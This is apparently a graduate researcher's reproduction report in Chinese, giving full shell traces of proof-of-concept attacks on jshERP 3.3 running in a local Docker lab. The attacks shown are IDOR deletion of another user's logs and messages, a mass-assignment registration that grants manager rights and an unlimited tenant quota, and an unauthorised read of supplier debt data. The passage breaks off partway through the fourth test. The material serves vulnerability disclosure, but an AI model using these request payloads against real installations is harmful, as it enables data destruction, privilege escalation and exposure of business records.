# jshERP 3.3 四漏洞完整命令追踪报告

本报告不做筛选，按 `sh -x` 原样记录每条 PoC 的所有命令与执行结果。

- 生成时间: 2026-03-02 13:15:12 +0800
- 转录目录: `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/full_transcripts/20260302_131349`
- 总行数: 563

## 漏洞 1+2: IDOR 越权删除 Log/Msg（完整命令与结果）

源文件: `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/full_transcripts/20260302_131349/01_idor_log_msg_full.txt`

```text
+ set -e
+ BASE=http://127.0.0.1:9999/jshERP-boot
++ date +%s
+ STAMP=1772428442
+ LOG_MARK=poc-log-owner-63-1772428442
+ MSG_MARK=poc-msg-owner-63-1772428442
+ step '1) 登录获取 token（jsh 与 test123）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 1) 登录获取 token（jsh 与 test123）'
[STEP] 1) 登录获取 token（jsh 与 test123）
+ echo ==============================
==============================
++ login_token test123
++ user=test123
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"test123","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_TEST=50520bf9d8f54ef08f2ce7e80c68020b_63
++ login_token jsh
++ user=jsh
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_JSH=304e8065a0a84359ad5ee03b7c12399a_63
+ echo 'jsh token: 304e8065a0a84359ad5ee03b7c12399a_63'
jsh token: 304e8065a0a84359ad5ee03b7c12399a_63
+ echo 'test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63'
test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63
+ step '2) 查看当前数据库基线（删除前）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 2) 查看当前数据库基线（删除前）'
[STEP] 2) 查看当前数据库基线（删除前）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
49
0
+ step '3) 构造受害者数据（user_id=63, tenant_id=63）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 3) 构造受害者数据（user_id=63, tenant_id=63）'
[STEP] 3) 构造受害者数据（user_id=63, tenant_id=63）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
+ docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'POC_LOG','127.0.0.1',NOW(),0,'poc-log-owner-63-1772428442',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('poc-msg-owner-63-1772428442','poc',NOW(),'系统',63,'1',63,'0');\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
++ docker exec jsherp33-mysql sh -lc 'mysql -N -ujsherp -p123456 -D jsh_erp -e "SELECT id FROM jsh_log WHERE content='\''poc-log-owner-63-1772428442'\'' ORDER BY id DESC LIMIT 1;"'
++ tail -n 1
mysql: [Warning] Using a password on the command line interface can be insecure.
+ LOG_ID=55
++ docker exec jsherp33-mysql sh -lc 'mysql -N -ujsherp -p123456 -D jsh_erp -e "SELECT id FROM jsh_msg WHERE msg_title='\''poc-msg-owner-63-1772428442'\'' ORDER BY id DESC LIMIT 1;"'
++ tail -n 1
mysql: [Warning] Using a password on the command line interface can be insecure.
+ MSG_ID=7
+ echo 'Seeded LOG_ID=55, MSG_ID=7'
Seeded LOG_ID=55, MSG_ID=7
+ step '4) 查看受害者数据（确认属于 jsh）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 4) 查看受害者数据（确认属于 jsh）'
[STEP] 4) 查看受害者数据（确认属于 jsh）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
55	63	63	poc-log-owner-63-1772428442
7	63	63	poc-msg-owner-63-1772428442
+ step '5) 攻击者 test123 删除 jsh 的日志'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 5) 攻击者 test123 删除 jsh 的日志'
[STEP] 5) 攻击者 test123 删除 jsh 的日志
+ echo ==============================
==============================
+ run 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s -X DELETE 'http://127.0.0.1:9999/jshERP-boot/log/delete?id=55' -H 'X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
{"code":200,"data":{"message":"成功"}}+ echo '[DB 状态] 删除日志后检查'
[DB 状态] 删除日志后检查
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
+ step '6) 攻击者 test123 删除 jsh 的消息'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 6) 攻击者 test123 删除 jsh 的消息'
[STEP] 6) 攻击者 test123 删除 jsh 的消息
+ echo ==============================
==============================
+ run 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s -X DELETE 'http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7' -H 'X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
{"code":200,"data":{"message":"成功"}}+ echo '[DB 状态] 删除消息后检查'
[DB 状态] 删除消息后检查
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
+ step '7) 最终数据库状态汇总'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 7) 最终数据库状态汇总'
[STEP] 7) 最终数据库状态汇总
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
50
0
+ echo

+ echo '[Context]'
[Context]
+ echo 'jsh token: 304e8065a0a84359ad5ee03b7c12399a_63'
jsh token: 304e8065a0a84359ad5ee03b7c12399a_63
+ echo 'test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63'
test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63
```

## 漏洞 3: registerUser 批量赋值（完整命令与结果）

源文件: `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/full_transcripts/20260302_131349/02_mass_assignment_full.txt`

```text
+ set -e
+ BASE=http://127.0.0.1:9999/jshERP-boot
++ date +%s
+ U=pocma1772428463
+ P=e10adc3949ba59abbe56e057f20f883e
++ cat
+ PAYLOAD='{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
+ step '1) 查看注册前数据库基线'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 1) 查看注册前数据库基线'
[STEP] 1) 查看注册前数据库基线
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
11
9
+ step '2) 发起注册请求（携带敏感字段）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 2) 发起注册请求（携带敏感字段）'
[STEP] 2) 发起注册请求（携带敏感字段）
+ echo ==============================
==============================
+ echo '[Payload]'
[Payload]
+ echo '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
+ post_register '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
+ payload='{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
+ echo '+ docker exec -i jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-"'
+ docker exec -i jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/registerUser' -H 'Content-Type: application/json' --data-binary @-"
+ printf %s '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
+ docker exec -i jsherp33-app sh -lc 'curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-'
{"msg":"操作成功","code":200}+ echo

+ step '3) 查看注册后用户表状态（重点看 ismanager）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 3) 查看注册后用户表状态（重点看 ismanager）'
[STEP] 3) 查看注册后用户表状态（重点看 ismanager）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='pocma1772428463';\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
140	pocma1772428463	1	0	0	140
+ step '4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）'
[STEP] 4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='pocma1772428463';\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
140	pocma1772428463	9999999	2099-12-31 23:59:59	poc-mass-assignment
+ step '5) 登录该新账号，确认可直接使用'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 5) 登录该新账号，确认可直接使用'
[STEP] 5) 登录该新账号，确认可直接使用
+ echo ==============================
==============================
+ run 'docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
+ docker exec jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/login' -H 'Content-Type: application/json' -d '{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
{"code":200,"data":{"user":{"id":140,"username":"pocma1772428463","loginName":"pocma1772428463","password":null,"leaderFlag":"0","position":null,"department":null,"email":null,"phonenum":null,"ismanager":1,"isystem":0,"status":0,"description":null,"remark":"poc-mass-assignment","weixinOpenId":null,"tenantId":140},"msgTip":"user can login","token":"f4245e266a85479b9be970bfda4e1880_140"}}+ step '6) 最终数据库状态汇总'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 6) 最终数据库状态汇总'
[STEP] 6) 最终数据库状态汇总
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
12
10
+ echo

+ echo '[Context] username=pocma1772428463'
[Context] username=pocma1772428463
```

## 漏洞 4A: supplier 同租户低权限越权读取（完整命令与结果）

源文件: `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/full_transcripts/20260302_131349/03_supplier_scope_bypass_full.txt`

```text
+ set -e
+ BASE=http://127.0.0.1:9999/jshERP-boot
+ P=e10adc3949ba59abbe56e057f20f883e
+ step '1) 登录获取 token（jsh 与 test123）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 1) 登录获取 token（jsh 与 test123）'
[STEP] 1) 登录获取 token（jsh 与 test123）
+ echo ==============================
==============================
++ login_token test123
++ user=test123
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"test123","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_TEST=69f75a16ad0d41ea9b111c7f302880a5_63
++ login_token jsh
++ user=jsh
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_JSH=072b104fba7e4d12873c230a8733304d_63
+ echo 'test123 token: 69f75a16ad0d41ea9b111c7f302880a5_63'
test123 token: 69f75a16ad0d41ea9b111c7f302880a5_63
+ echo 'jsh token: 072b104fba7e4d12873c230a8733304d_63'
jsh token: 072b104fba7e4d12873c230a8733304d_63
+ step '2) 查看 test123 的角色功能绑定（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 2) 查看 test123 的角色功能绑定（数据库状态）'
[STEP] 2) 查看 test123 的角色功能绑定（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,key_id,type,value,tenant_id FROM jsh_user_business WHERE type='\''RoleFunctions'\'' AND key_id=17;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,key_id,type,value,tenant_id FROM jsh_user_business WHERE type='\''RoleFunctions'\'' AND key_id=17;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,key_id,type,value,tenant_id FROM jsh_user_business WHERE type='RoleFunctions' AND key_id=17;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,key_id,type,value,tenant_id FROM jsh_user_business WHERE type='\''RoleFunctions'\'' AND key_id=17;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
69	17	RoleFunctions	[210][225][211][241][32][33][199][242][38][41][200][201][239][202][40][232][233][197][44][203][204][205][206][212]	63
+ step '3) 查看供应商/客户相关功能 ID（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 3) 查看供应商/客户相关功能 ID（数据库状态）'
[STEP] 3) 查看供应商/客户相关功能 ID（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,name,url FROM jsh_function WHERE id IN (25,217,235,237) ORDER BY id;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,name,url FROM jsh_function WHERE id IN (25,217,235,237) ORDER BY id;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,name,url FROM jsh_function WHERE id IN (25,217,235,237) ORDER BY id;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,name,url FROM jsh_function WHERE id IN (25,217,235,237) ORDER BY id;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
25	供应商信息	/system/vendor
217	客户信息	/system/customer
235	客户对账	/report/customer_account
237	供应商对账	/report/vendor_account
+ step '4) 查看将要读取的往来单位数据（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 4) 查看将要读取的往来单位数据（数据库状态）'
[STEP] 4) 查看将要读取的往来单位数据（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
57	供应商1	供应商	0.000000	0.000000	63
58	客户1	客户	0.000000	0.000000	63
74	供应商5	供应商	0.000000	5.000000	63
+ step '5) 用低权限账号 test123 直接读取债务接口'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 5) 用低权限账号 test123 直接读取债务接口'
[STEP] 5) 用低权限账号 test123 直接读取债务接口
+ echo ==============================
==============================
+ for id in 57 58 74
+ echo 'organId=57 (attacker=test123)'
organId=57 (attacker=test123)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57' -H 'X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ for id in 57 58 74
+ echo 'organId=58 (attacker=test123)'
organId=58 (attacker=test123)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58' -H 'X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'"
